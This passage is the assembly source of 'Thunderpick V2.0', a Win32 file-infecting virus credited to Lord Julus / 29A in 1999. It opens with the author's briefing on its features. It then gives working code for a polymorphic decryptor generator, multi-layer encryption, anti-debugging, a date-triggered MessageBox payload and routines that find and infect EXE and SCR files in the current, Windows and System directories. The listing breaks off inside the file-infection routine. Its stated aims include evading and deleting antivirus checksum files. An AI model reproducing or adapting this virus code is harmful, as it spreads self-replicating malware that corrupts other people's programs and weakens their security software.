 comment $

 лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

	Thunderpick is my newest baby. Let's see a briefing about it:

 лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

	Virus Name	  : Thunderpick V2.0
	Virus Author	  : Lord Julus / [29A]
	Virus Size	  : 7529 bytes
	Release Date	  : 1 Nov. 1999
	Target OS	  : Win32s, Windows 95/98, Windows NT, Windows 2000
	Target Files	  : PE Executbles (EXE, SCR)
	Type		  : Non-resident
	Append Method	  : Code section relocating and replacing
	Encrypted	  : Yes (multiple layers)
	Polymorphic	  : Yes (low-level polymorphism)
	Avoid AV files	  : Yes
	Kill AV files	  : Yes
	Payload Date	  : Day 07 of any month after hour 14:00
	Payload 	  : Graphical

 лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

	The  name  of  this virus is the name of one of the best bass solos I
 ever heard, sang by Joey DeMaio from Manowar and which appeared on the "Sign
 of the hammer" album. You should hear it!!

	As  being  a pure Win32 application this virus should have no problem
 in  working  under all actual Win32 environments. The anti-debugging feature
 contains   a call to the IsDebuggerPresent API which doesn't exist on Win95.
 However, to maintain the infection ability on this OS, the anti-debugging is
 avoided a little if the OS is Win95.

	What  is  unique  about this virus is it's appending method. What the
 virus does when infecting a clean victim is this:

	First the code section is located. If the virus length is bigger than
 the victim's code section, the infection process stops. If the virus can fit
 in  the  code	section  then  the  next  steps continue. The last section is
 increased with the virus size plus some additional space. Then, a part equal
 to  the  virus  size  is taken from the code section and copied into the new
 increased  space  in  the  last  section.  After that the relocating code is
 placed  after	it  as	the last piece of code there. All this amount of code
 (original  moved  code  plus  relocating code) get heavily encrypted with an
 algorithm  that  loops  about 500.000 times. Then the virus copied itself in
 the  original code section, over the place which was moved at the end. Then,
 the  entire virus body gets encrypted with two encryption layers. The deeper
 one  is another loooong algorithm (executes around 450.000 instructions) and
 the  above one is the polymorphic algorithm. Then all rearangements are made
 in  the  PE  header,  making  the  entrypoint to point the virus code (which
 resides  in the old code section). When the infected host executes the virus
 will  execute	first.	After  that,  the  control  will  be  passed  to  the
 relocating code which will copy the original code section back into it's old
 place	and make a jump to it. All registers and flags are preserved. In this
 way  the virus code can stay in the code section, making it's detection much
 harder.

	Please note that the place into the code section where the virus gets
 placed is random. Also, some random size is added at the end of file to make
 it even harder to remove.

	About  polymorphism,  this  virus  doesn't have a polymorphic engine.
 Instead the polymorphic decryptor is placed at the beginning of the code and
 it gets mutated at infection time.

	The  virus  avoids  to	infect	certain  anti-virus products and also
 attempts to delete all AV checksum files it can find.

	The  payload  triggers	on the 7th day of any month after 14:00 hour,
 when a MessageBox displays a some verses... ;-)

	Credits: Prizzy/29A (for the DR0 WinNT bug)

	$

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
.486p						   ;нneeded cpu
.model flat, stdcall				   ;нmodel
jumps						   ;нsolve jumps
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
TRUE  = 1					   ;нtrue value
FALSE = 0					   ;нfalse value
DEBUG = TRUE					   ;нdebug status
GOAT  = TRUE					   ;нinfect goat files?
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
extrn ExitProcess      : proc			   ;нexternals only required
extrn GetModuleHandleA : proc			   ;нonly by the first
extrn GetProcAddress   : proc			   ;нgeneration
extrn MessageBoxA      : proc			   ;н
extrn CheckSumMappedFile:proc			   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
.data						   ;нdummy data area
db 0						   ;н
include w32nt_lj.inc				   ;нequates and structures
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
.code						   ;нvirus code starts...
start:						   ;н...here
       pusha					   ;нsave all registers
;mov eax, end-start				   ;н
poly_decryptor: 				   ;н
       jmp virusrun				   ;нthis is where the poly
       db 1000d dup(0h) 			   ;нdecryptor will be
poly_code_start:				   ;н
       jmp virusrun				   ;нneed this!!!
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
create_poly:					   ;нThe poly generator stars
; EDI = address of code to encrypt		   ;нhere...
; ESI = address to place decryptor to		   ;н
; ECX = length of code to encrypt		   ;н
; EBX = address of code to decrypt at runtime	   ;н
       pusha					   ;нsave data
       mov [ebp+address1], edi			   ;н
       mov [ebp+address2], esi			   ;н
       mov [ebp+length], ecx			   ;н
       mov dword ptr [ebp+@100+1], ebx		   ;нfill in code address
       mov eax, 0FFFFFFFEh			   ;н
       call brandom32				   ;н
       mov dword ptr [ebp+@101+1], eax		   ;нfill in key
       mov [ebp+polykey], eax			   ;н
       mov dword ptr [ebp+@102+1], ecx		   ;н
       mov eax, 0FFFFFFFEh			   ;н
       call brandom32				   ;н
       mov dword ptr [ebp+@104+2], eax		   ;нfill in value
       mov [ebp+value], eax			   ;н
       mov eax, 0FFFFFFFEh			   ;н
       call brandom32				   ;н
       mov dword ptr [ebp+@106+2], eax		   ;нfill in key modifier
       mov [ebp+keymodif], eax			   ;н
       mov ecx, 100h				   ;н
mangle_loop:					   ;нchoose random registers
       lea ebx, [ebp+regs]			   ;н
       lea edx, [ebp+regs]			   ;н
       mov eax, 6				   ;н
       call brandom32				   ;н
       add ebx, eax				   ;н
       mov eax, 6				   ;н
       call brandom32				   ;н
       add edx, eax				   ;н
       mov al, byte ptr [edx]			   ;н
       xchg al, byte ptr [ebx]			   ;н
       mov byte ptr [edx], al			   ;н
       loop mangle_loop 			   ;н
       mov al, [ebp+preg]			   ;нfill pointer reg
       and byte ptr [ebp+@100], 11111000b	   ;н
       or byte ptr [ebp+@100], al		   ;н
						   ;н
       and byte ptr [ebp+@500+1], 11111000b	   ;н
       or byte ptr [ebp+@500+1], al		   ;н
						   ;н
       mov al, [ebp+kreg]			   ;нfill key reg
       and byte ptr [ebp+@101], 11111000b	   ;н
       or byte ptr [ebp+@101], al		   ;н
       and byte ptr [ebp+@106+1], 11111000b	   ;н
       or byte ptr [ebp+@106+1], al		   ;н
       mov al, [ebp+lreg]			   ;нfill length reg
       and byte ptr [ebp+@102], 11111000b	   ;н
       or byte ptr [ebp+@102], al		   ;н
       mov al, [ebp+creg]			   ;нfill code reg
       and byte ptr [ebp+@104+1], 11111000b	   ;н
       or byte ptr [ebp+@104+1], al		   ;н
       mov al, [ebp+creg]			   ;нand others...;-/
       shl al, 3				   ;н
       or al, [ebp+kreg]			   ;н
       and byte ptr [ebp+@105+1], 11000000b	   ;н
       or byte ptr [ebp+@105+1], al		   ;н
       mov al, [ebp+creg]			   ;н
       shl al, 3				   ;н
       or al, [ebp+preg]			   ;н
       and byte ptr [ebp+@103+1], 11000000b	   ;н
       or byte ptr [ebp+@103+1], al		   ;н
       and byte ptr [ebp+@107+1], 11000000b	   ;н
       or byte ptr [ebp+@107+1], al		   ;н
       mov al, [ebp+preg]			   ;н
       and byte ptr [ebp+@108+1], 11111000b	   ;н
       or byte ptr [ebp+@108+1], al		   ;н
       mov al, [ebp+lreg]			   ;н
       and byte ptr [ebp+@109], 11111000b	   ;н
       or byte ptr [ebp+@109], al		   ;н
       lea edi, [ebp+op1]			   ;нchoose randomly the
       mov eax, 2				   ;нthree operations
       call brandom32				   ;н
       mov [ebp+index1], eax			   ;н
       add edi, eax				   ;н
       mov al, byte ptr [edi]			   ;н
       mov byte ptr [ebp+@105], al		   ;н
						   ;н
       lea edi, [ebp+op2]			   ;н
       mov eax, 2				   ;н
       call brandom32				   ;н
       mov [ebp+index2], eax			   ;н
       add edi, eax				   ;н
       mov al, byte ptr [edi]			   ;н
       and byte ptr [ebp+@104+1], 00000111b	   ;н
       or byte ptr [ebp+@104+1], al		   ;н
						   ;н
       lea edi, [ebp+op2]			   ;н
       mov eax, 2				   ;н
       call brandom32				   ;н
       mov [ebp+index3], eax			   ;н
       add edi, eax				   ;н
       mov al, byte ptr [edi]			   ;н
       and byte ptr [ebp+@106+1], 00000111b	   ;н
       or byte ptr [ebp+@106+1], al		   ;н
						   ;н
       lea esi, [ebp+@100]			   ;нnow move the instruct.
       mov edi, [ebp+address2]			   ;нand generate junk...
       lea ebx, [ebp+instr_len] 		   ;н
       mov eax, 1				   ;н
       call makejunk				   ;н
move_decryptor: 				   ;н
       mov ecx, [ebx]				   ;нget instruction length
       jcxz done_move				   ;н
       rep movsb				   ;нmove it!
       add ebx, 4				   ;н
       inc eax					   ;н
       cmp eax, 4				   ;н
       jne no_case				   ;н
       mov [ebp+save], edi			   ;н
no_case:					   ;н
       cmp eax, 11d				   ;н
       je no_junk				   ;н
       call makejunk				   ;нdo junk!
no_junk:					   ;н
       jmp move_decryptor			   ;н
						   ;н
done_move:					   ;н
       mov eax, edi				   ;н
       sub eax, dword ptr [ebp+save]		   ;н
       neg eax					   ;н
       mov dword ptr [edi-4], eax		   ;н
						   ;н
       mov eax, [ebp+address2]			   ;нfill in the jump to
       sub eax, edi				   ;нvirus body
       neg eax					   ;н
       mov ebx, poly_code_start-poly_decryptor	   ;н
       sub ebx, eax				   ;н
       mov edx, dword ptr [ebp+poly_code_start+1]  ;н
       add edx, ebx				   ;н
       mov al, 0E9h				   ;н
       stosb					   ;н
       mov eax, edx				   ;н
       stosd					   ;н
						   ;н
       mov eax, [ebp+value]			   ;нnow prepare the
       mov dword ptr [ebp+@200+2], eax		   ;нencryptor to make the
       mov eax, [ebp+keymodif]			   ;нencryption of the code
       mov dword ptr [ebp+@202+2], eax		   ;н
						   ;н
       lea edi, [ebp+unop1]			   ;н
       add edi, [ebp+index1]			   ;н
       mov al, byte ptr [edi]			   ;н
       mov byte ptr [ebp+@201], al		   ;н
						   ;н
       lea edi, [ebp+unop2]			   ;н
       add edi, [ebp+index2]			   ;н
       mov al, byte ptr [edi]			   ;н
       and byte ptr [ebp+@200+1], 00000111b	   ;н
       or byte ptr [ebp+@200+1], al		   ;н
						   ;н
       lea edi, [ebp+op2]			   ;н
       add edi, [ebp+index3]			   ;н
       mov al, byte ptr [edi]			   ;н
       and byte ptr [ebp+@202+1], 00000111b	   ;н
       or byte ptr [ebp+@202+1], al		   ;н
						   ;н
       mov edi, [ebp+address1]			   ;н
       mov ebx, [ebp+polykey]			   ;н
       mov ecx, [ebp+length]			   ;н
						   ;н
encrypt_poly:					   ;нencrypt the code!
       mov edx, [edi]				   ;н
@201:  add edx, ebx				   ;н
@200:  add edx, 12345678h			   ;н
@202:  add ebx, 12345678h			   ;н
       mov [edi], edx				   ;н
       add edi, 4				   ;н
       dec ecx					   ;н
       jnz encrypt_poly 			   ;н
       popa					   ;н
       ret					   ;н
						   ;н
makejunk:					   ;нhere we make some
       push eax ebx				   ;нrandom amount of junk
       mov al, 0E9h				   ;н
       stosb					   ;н
       xor eax, eax				   ;н
       stosd					   ;н
       mov ebx, edi				   ;н
       mov eax, 30				   ;н
       call brandom32				   ;н
       inc eax					   ;н
       mov ecx, eax				   ;н
						   ;н
junk_loop:					   ;н
       mov eax, 0FFFFFFFEh			   ;н
       call brandom32				   ;н
       stosd					   ;н
       loop junk_loop				   ;н
						   ;н
       mov eax, edi				   ;н
       sub eax, ebx				   ;н
       mov dword ptr [ebx-4], eax		   ;н
       pop ebx eax				   ;н
       ret					   ;н
@100:  mov ebx, 12345678h			   ;нstore code offset
@500:  add ebx, 12345678h			   ;н
@101:  mov ebx, 12345678h			   ;нstore key
@102:  mov ebx, 12345678h			   ;нstore length
@103:  mov ebx, [ebx]				   ;нget a dword
@104:  add ebx, 12345678h			   ;нdecrypt with value
@105:  add ebx, ebx				   ;нdecrypt with key
@106:  add ebx, 12345678h			   ;нmodify key
@107:  mov [ebx], ebx				   ;нstore dword
@108:  add ebx, 4				   ;нincrease pointer
@109:  dec ebx					   ;нdecrease length
       jz @10A					   ;нuntil the end
       db 0E9h					   ;н
       dd 0					   ;н
@10A:						   ;н
polykey  dd 0					   ;н
value	 dd 0					   ;н
keymodif dd 0					   ;н
length	 dd 0					   ;н
address1 dd 0					   ;н
address2 dd 0					   ;н
save	 dd 0					   ;н
finito	 dd 0					   ;н
regs:						   ;н
creg  db 0					   ;н code
lreg  db 1					   ;н length of code
kreg  db 2					   ;н encryption key
preg  db 3					   ;н pointer in code
jreg2 db 6					   ;н Junk register #1
jreg3 db 7					   ;н Junk register #2
						   ;н
op1   db 33h, 2Bh, 03h				   ;н
unop1 db 33h, 03h, 2Bh				   ;н
						   ;н
op2   db 11110000b, 11101000b, 11000000b	   ;н
unop2 db 11110000b, 11000000b, 11101000b	   ;н
						   ;н
index1 dd 0					   ;н
index2 dd 0					   ;н
index3 dd 0					   ;н
						   ;н
instr_len dd @101-@100, @102-@101, @103-@102	   ;н
	  dd @104-@103, @105-@104, @106-@105	   ;н
	  dd @107-@106, @108-@107, @109-@108	   ;н
	  dd @10A-@109, 0			   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
virusrun:					   ;н
       call getdelta				   ;нget delta handle
						   ;н
getdelta:					   ;н
       pop ebp					   ;н
       sub ebp, offset getdelta 		   ;н
       call @13 				   ;нnow obtain the imagebase
@13:   pop eax					   ;нwhere the host loaded
@12:   sub eax, 00001000h+(@12-start)-1 	   ;н
       mov dword ptr [ebp+imagebase], eax	   ;нand save it...
       jmp done 				   ;н
       imagebase dd 00400000h			   ;нdefault imagebase
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
done:						   ;н
       cmp [ebp+first_gen], 0			   ;нdon't decrypt for
       je decrypt_level_2			   ;нgen. 1
						   ;н
       mov ecx, 100h				   ;н
						   ;н
decrypt_iteration:				   ;н
       mov edx, 'DEAD'+'MEAT'			   ;нinitialize decryptor
       lea edi, [ebp+decrypt_level_2]		   ;н
       mov esi, edi				   ;н
       mov ebx, (end-decrypt_level_2)/4 	   ;н
						   ;н
decrypt_routine:				   ;н
       lodsd					   ;нdo decryption.
       ror eax, 16				   ;нThis decryptor loops
       xor eax, 'LORD'+'JULU'+'S'		   ;нabout 310.000 times
       rol eax, 16				   ;нand executes thou
       add eax, 'THUN'+'DERP'+'ICK'		   ;нaround 4.650.000
       sub eax, edx				   ;нinstructions.
       add edx, 'KICK'+'ASS!'			   ;н
       stosd					   ;н
       dec ebx					   ;н
       jnz decrypt_routine			   ;н
       loop decrypt_iteration			   ;н
       mov [ebp+delta], ebp			   ;нsave delta for later
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
decrypt_level_2:				   ;н
       IF DEBUG 				   ;нif debug is off we
       ELSE					   ;нalso need to restore
       mov [ebp+delta2], ebp			   ;нthis...
       ENDIF					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
       jmp FindNeededStuff			   ;нget module bases and
first_gen db 0					   ;нapi addresses.
db " ThunderPick V2.0 Release November 1999 "	   ;н
db " by Lord Julus / [29A]		    "	   ;н
FinishedLocatingStuff:				   ;нif successful...
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Anti_Debugging: 				   ;н
       IF DEBUG 				   ;нif this is the release
       ELSE					   ;нversion, we must do the
       lea eax, [ebp+DebuggerKill]		   ;нantidebugging stuffs.
       push eax 				   ;нHere we set up a new
       xor ebx, ebx				   ;нseh frame and then we
       push dword ptr fs:[ebx]			   ;нmake an exception error
       mov fs:[ebx], esp			   ;нoccur.
       dec dword ptr [ebx]			   ;нTD stops here if in
						   ;нdefault mode.
       push 0					   ;нif instruction is not
       jmp Anti_Debugging			   ;нexecuted the system will
						   ;нhalt...
DebuggerKill:					   ;н
       mov esp, [esp+8] 			   ;нthe execution goes here
       pop dword ptr fs:[0]			   ;н
       add esp, 4				   ;н
						   ;н
       db 0BDh					   ;нdelta gets lost so we
delta2 dd 0					   ;нmust restore it...
						   ;н
       call @6					   ;нhere we try to retrieve
       db 'IsDebuggerPresent', 0		   ;нIsDebuggerPresent API
@6:    push [ebp+k32]				   ;нif we fail it means we
       call [ebp+_GetProcAddress]		   ;нdon't have this api
       or eax, eax				   ;н(Windows95)
       jz continue_process			   ;н
						   ;н
       call eax 				   ;нLet's check if our
       or eax, eax				   ;нprocess is being
       jne shut_down				   ;нdebugged.
       jmp continue_process			   ;н
						   ;н
       shut_down:				   ;н
       push 0					   ;нIf so, close down!!
       call [ebp+_ExitProcess]			   ;нclose
       ENDIF					   ;н
continue_process:				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
       cmp [ebp+first_gen], 0			   ;нa little trick to
       jne ok_					   ;нensure the right run
       mov [ebp+gen1], 1			   ;нof the first gen.
       jmp ok__ 				   ;н
						   ;н
ok_:						   ;н
       mov [ebp+gen1], 0			   ;н
						   ;н
ok__:						   ;н
       call Randomize				   ;нinitialize random gen.
       call Decrypt				   ;нdecrypt stuff
       call Payload				   ;нtry the payload
       call Infect				   ;нinfect files
       call KillAV				   ;нkill av files
       jmp ReturnToHost 			   ;нand return to host
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Decrypt:					   ;н
       cmp [ebp+first_gen], 0			   ;нlet's decrypt the orig.
       jne do_it				   ;нcode and the relocating
       ret					   ;нcode.
						   ;н
do_it:						   ;н
       pusha					   ;нsave regs
       lea ebx, [ebp+key]			   ;н
       mov eax, dword ptr [ebx] 		   ;нget key
       mov esi, dword ptr [ebp+increment]	   ;нget key increment
@10:   mov edi, 12345678h			   ;нaddress of code
       add edi, [ebp+imagebase] 		   ;н
       mov ecx, incrsize/4			   ;нsize of code
       mov ebx, dword ptr [ebp+iterations]	   ;нnumber of iterations
       push edi 				   ;нsave edi
						   ;н
decrypt_loop:					   ;н
       mov edx, [edi]				   ;нget dword
       add edx, eax				   ;нincrement with key
       sub eax, esi				   ;нincrement key
       xor edx, esi				   ;нxor with increment
       ror edx, 1				   ;нrotate
       mov [edi], edx				   ;нand store
       add edi, 4				   ;нgo to next dword
       loop decrypt_loop			   ;нloop until end
       dec ebx					   ;нdecrement iterations
       jz ready 				   ;н
       lea ecx, [ebp+key]			   ;н
       mov eax, [ecx]				   ;н
       mov ecx, incrsize/4			   ;нredo all...
       pop edi					   ;н
       push edi 				   ;н
       jmp decrypt_loop 			   ;н
						   ;н
ready:						   ;н
       pop edi					   ;н
       popa					   ;н
       ret					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Payload:					   ;н
       pusha					   ;н
       call @30 				   ;н
time   SYSTEMTIME <0>				   ;н
@30:   call [ebp+_GetSystemTime]		   ;н
						   ;н
       lea edi, [ebp+time]			   ;н
       cmp dword ptr [edi.ST_wDay], 7		   ;н
       jne nopayload				   ;н
       cmp dword ptr [edi.ST_wHour], 14d	   ;н
       jbe nopayload				   ;н
						   ;н
       push 1000h				   ;н
       call @31 				   ;н
       db 'Win32.ThunderPick / [29A]',0 	   ;н
@31:   call @32 				   ;ллллллллллллллллллллллллл
       db 10,13,'	It''s  time  for  the  Thunder...	  ',10,13  ;о
       db	'	It''s  time  for  the  Pick...		  ',10,13  ;о
       db	'	And it''s  time  for  the  Rocker	  ', 10,13 ;о
       db	'	Your  bottom  to  kick !!!		  ',10,13,0;о
@32:   push 0					   ;ллллллллллллллллллллллллл
       call [ebp+_MessageBoxA]			   ;н
						   ;н
nopayload:					   ;н
       popa					   ;н
       ret					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Infect: 					   ;н
       mov [ebp+first_gen], 1			   ;нmark the first gen.
       push 0					   ;нGet the drive type. If
       call [ebp+_GetDriveTypeA]		   ;нit is a fixed drive
       sub [ebp+crt_dir_flag], eax		   ;нthan this value = 0
						   ;н
       push 260 				   ;нGet Windows directory
       call @1					   ;н
windir db 260 dup(0)				   ;н
@1:    call [ebp+_GetWindowsDirectoryA] 	   ;н
						   ;н
       push 260 				   ;нGet System directory
       call @2					   ;н
sysdir db 260 dup(0)				   ;н
@2:    call [ebp+_GetSystemDirectoryA]		   ;н
						   ;н
       call @3					   ;нGet current directory
crtdir db 260 dup(0)				   ;н
@3:    push 260 				   ;н
       call [ebp+_GetCurrentDirectoryA] 	   ;н
						   ;н
       cmp dword ptr [ebp+crt_dir_flag], 0	   ;нare we on a fixed disk?
       jne direct_to_windows			   ;н
						   ;н
       mov dword ptr [ebp+infections], 0FFFFh	   ;нinfect all files there
       call Infect_Directory			   ;н
						   ;н
direct_to_windows:				   ;н
       cmp [ebp+gen1], 1			   ;нfirst generation?
       je back_to_current_dir			   ;н
       lea eax, [ebp+offset windir]		   ;нChange to Windows dir.
       push eax 				   ;н
       call [ebp+_SetCurrentDirectoryA] 	   ;н
						   ;н
       mov dword ptr [ebp+infections], 3	   ;нinfect 3 files there
       call Infect_Directory			   ;н
						   ;н
       lea eax, [ebp+offset sysdir]		   ;нChange to System dir.
       push eax 				   ;н
       call [ebp+_SetCurrentDirectoryA] 	   ;н
						   ;н
       mov dword ptr [ebp+infections], 3	   ;нinfect 3 files there
       call Infect_Directory			   ;н
						   ;н
back_to_current_dir:				   ;н
       lea eax, [ebp+offset crtdir]		   ;нChange back to crt dir.
       push eax 				   ;н
       call [ebp+_SetCurrentDirectoryA] 	   ;н
       ret					   ;н
infections   dd 0				   ;н
crt_dir_flag dd 3				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Infect_Directory:				   ;н
       mov [ebp+crt_dir_flag], 3		   ;нreset this
       xor esi, esi				   ;н
						   ;н
re_do:						   ;н
       call @4					   ;нlocate first matching
       finddata WIN32_FIND_DATA <?>		   ;нfile.
@4:    or esi, esi				   ;н
       jnz next_mask				   ;н
       call @5					   ;н
       IF GOAT					   ;н
       filemask1 db 'goat*.exe',0		   ;н
       ELSE					   ;н
       filemask1 db '*.EXE',0			   ;н
       ENDIF					   ;н
						   ;н
next_mask:					   ;н
       call @5					   ;н
       IF GOAT					   ;н
       filemask2 db 'goat*.scr', 0		   ;н
       ELSE					   ;н
       filemask2 db '*.SCR', 0			   ;н
       ENDIF					   ;н
@5:    call [ebp+_FindFirstFileA]		   ;н
       mov [ebp+findhandle], eax		   ;н
						   ;н
compare:					   ;н
       call CheckError				   ;н
       jc get_next				   ;н
						   ;н
       lea edi, [ebp+finddata.WFD_cFileName]	   ;нget name
       call Infect_File 			   ;нand infect it
       jc no_infection				   ;н
       dec [ebp+infections]			   ;н
       jz finished_infection			   ;н
						   ;н
no_infection:					   ;н
       lea ebx, [ebp+finddata]			   ;нlocate next matching
       push ebx 				   ;нname.
       push [ebp+findhandle]			   ;н
       call [ebp+_FindNextFileA]		   ;н
       jmp compare				   ;н
						   ;н
get_next:					   ;н
       cmp esi, extensions			   ;н
       je finished_infection			   ;н
       inc esi					   ;н
       jmp re_do				   ;н
						   ;н
finished_infection:				   ;н
       push [ebp+findhandle]			   ;н
       call [ebp+_FindClose]			   ;н
       ret					   ;н
extensions equ 1				   ;н
findhandle dd 0 				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Infect_File:					   ;н
       pusha					   ;нsave regs
						   ;н
       mov [ebp+flag], 0			   ;н
						   ;н
       push edi 				   ;н
       call ValidateName			   ;нvalidate the file
       jc quit_infection			   ;нname (e.g. no AV)
						   ;н
       push edi 				   ;н
       call [ebp+_GetFileAttributesA]		   ;нsave file's attributes
       mov [ebp+fileattributes], eax		   ;н
						   ;н
       push 80h 				   ;н
       push edi 				   ;н
       call [ebp+_SetFileAttributes]		   ;нset attributes to norm.
						   ;н
       push 0					   ;нopen the file!
       push FILE_ATTRIBUTE_NORMAL		   ;н
       push OPEN_EXISTING			   ;н
       push 0					   ;н
       push FILE_SHARE_READ + FILE_SHARE_WRITE	   ;н
       push GENERIC_READ + GENERIC_WRITE	   ;н
       push edi 				   ;н
       call [ebp+_CreateFileA]			   ;н
						   ;н
       call CheckError				   ;н
       jc quit_infection			   ;н
						   ;н
       mov [ebp+filehandle], eax		   ;нsave handle
						   ;н
       lea ebx, [ebp+filetime]			   ;нsave the file time
       push ebx 				   ;н
       add ebx, 8				   ;н
       push ebx 				   ;н
       add ebx, 8				   ;н
       push ebx 				   ;н
       push eax 				   ;н
       call [ebp+_GetFileTime]			   ;н
						   ;н
       push 0					   ;нget the file size
       push [ebp+filehandle]			   ;н
       call [ebp+_GetFileSize]			   ;н
						   ;н
       call CheckError				   ;н
       jc close_file				   ;н
						   ;н
       mov [ebp+filesize], eax			   ;нcalculate the memory
       add eax, incrsize			   ;нsize
       mov [ebp+memsize], eax			   ;н
						   ;н
       push 0					   ;нcreate a file mapping
       push [ebp+memsize]			   ;нobject
       push 0					   ;н
       push PAGE_READWRITE			   ;н
       push 0					   ;н
       push [ebp+filehandle]			   ;н
       call [ebp+_CreateFileMappingA]		   ;н
						   ;н
       call CheckError				   ;н
       jc close_file				   ;н
						   ;н
       mov [ebp+maphandle], eax 		   ;нsave the map handle
						   ;н
       push [ebp+memsize]			   ;нmap the file!
       push 0					   ;н
       push 0					   ;н
       push FILE_MAP_ALL_ACCESS 		   ;н
       push eax 				   ;н
       call [ebp+_MapViewOfFile]		   ;н
						   ;н
       call CheckError				   ;н
       jc close_map				   ;н
						   ;н
       mov [ebp+mapaddress], eax		   ;нsave the map address
						   ;н
       mov esi, eax				   ;н
						   ;н
       cmp word ptr [esi], 'ZM' 		   ;нDos signature
       jne unmap_view				   ;н
       mov esi, dword ptr [esi.MZ_lfanew]	   ;нget PEheader offset
       add esi, [ebp+mapaddress]		   ;н
						   ;н
       push 200h				   ;нcan we read?
       push esi 				   ;н
       call [ebp+_IsBadReadPtr] 		   ;н
       or eax, eax				   ;н
       jnz close_map				   ;н
						   ;н
       cmp word ptr [esi], 'EP' 		   ;нPE file?
       jne unmap_view				   ;н
						   ;н
       lea edi, [ebp+data_area] 		   ;нour data area
						   ;н
       mov eax, esi				   ;нnow get and save
       stosd					   ;нall the needed data from
       mov ax, [esi.NumberOfSections]		   ;нthe PE headers
       stosw					   ;н
       mov ax, [esi.SizeOfOptionalHeader]	   ;н
       stosw					   ;н
						   ;н
       add esi, IMAGE_FILE_HEADER_SIZE		   ;н
						   ;н
       mov ax, [esi.OH_MajorImageVersion]	   ;нalready infected?
       cmp ax, 'TH'				   ;н
       je close_map				   ;н
						   ;н
       mov [esi.OH_MajorImageVersion], 'TH'	   ;н
						   ;н
       mov eax, esi				   ;н
       stosd					   ;н
       mov eax, [esi.OH_SizeOfCode]		   ;н
       stosd					   ;н
       mov eax, [esi.OH_ImageBase]		   ;н
       stosd					   ;н
       mov eax, [esi.OH_FileAlignment]		   ;н
       stosd					   ;н
       mov eax, [esi.OH_SectionAlignment]	   ;н
       stosd					   ;н
       mov eax, [esi.OH_AddressOfEntryPoint]	   ;н
       stosd					   ;н
       mov eax, [esi.OH_BaseOfCode]		   ;н
       stosd					   ;н
       mov eax, [esi.OH_SizeOfImage]		   ;н
       stosd					   ;н
       jmp overdata				   ;н
						   ;н
data_area:					   ;нusefull data...
       peheader 	    dd 0		   ;н
       numberofsections     dw 0		   ;н
       sizeofoptionalheader dw 0		   ;н
       optionalheader	    dd 0		   ;н
       sizeofcode	    dd 0		   ;н
       image_base	    dd 0		   ;н
       filealign	    dd 0		   ;н
       sectionalign	    dd 0		   ;н
       eip		    dd 0		   ;н
       baseofcode	    dd 0		   ;н
       sizeofimage	    dd 0		   ;н
       firstsection	    dd 0		   ;н
       codesection	    dd 0		   ;н
       lastsection	    dd 0		   ;н
       randomincr	    dd 0		   ;н
overdata:					   ;н
       cmp [ebp+sizeofcode], virussize		   ;нour virus can fit the
       jb unmap_view				   ;нcode section?
						   ;н
       mov eax, [ebp+image_base]		   ;н
       mov dword ptr [ebp+@500+2], eax		   ;н
						   ;н
       add si, word ptr [ebp+sizeofoptionalheader] ;н
       mov eax, esi				   ;н
       stosd					   ;н
       xor ebx, ebx				   ;н
						   ;н
locate_code_section:				   ;нlet's locate the code
       mov eax, [esi.SH_VirtualAddress] 	   ;нsection...
       cmp eax, [ebp+baseofcode]		   ;н
       je found_it				   ;н
       add esi, IMAGE_SIZEOF_SECTION_HEADER	   ;н
       inc bx					   ;н
       cmp bx, [ebp+numberofsections]		   ;н
       jae unmap_view				   ;н
       jmp locate_code_section			   ;н
						   ;н
found_it:					   ;н
       mov eax, esi				   ;нfound!
       stosd					   ;н
						   ;н
       xor eax, eax				   ;нlet's locate the
       mov ax, [ebp+numberofsections]		   ;нlast section's header
       mov ecx, IMAGE_SIZEOF_SECTION_HEADER	   ;н
       dec eax					   ;н
       xor edx, edx				   ;н
       mul ecx					   ;н
       mov esi, [ebp+firstsection]		   ;н
       add esi, eax				   ;н
       mov eax, esi				   ;н
       stosd					   ;н
						   ;н
       mov eax, [ebp+sizeofcode]		   ;нget a random offset from
       sub eax, virussize+10h			   ;нthe start to put the
       call brandom32				   ;нcode there...
       mov [ebp+randomincr], eax		   ;н
						   ;н
       mov ebx, [ebp+codesection]		   ;нgo to code section's
       mov esi, [ebx.SH_PointerToRawData]	   ;нraw data
       add esi, [ebp+randomincr]		   ;н
						   ;нsave the address
       mov ebx, [ebp+lastsection]		   ;нgo to the last section
       mov edi, [ebx.SH_PointerToRawData]	   ;нat it's end...
       add edi, [ebx.SH_VirtualSize]		   ;н
						   ;н...and save that
       add edi, [ebp+mapaddress]		   ;нnormalize...
       add esi, [ebp+mapaddress]		   ;н
       mov ecx, virussize			   ;нbytes to transfer
       rep movsb				   ;нmove the code...
						   ;н
       mov eax, [ebx.SH_VirtualAddress] 	   ;нand also fill in the
       add eax, [ebx.SH_VirtualSize]		   ;нaddress for the reloc.
       mov dword ptr [ebp+@7+1], eax		   ;нcode
						   ;н
       mov dword ptr [ebp+@10+1], eax		   ;нand for the decryptor
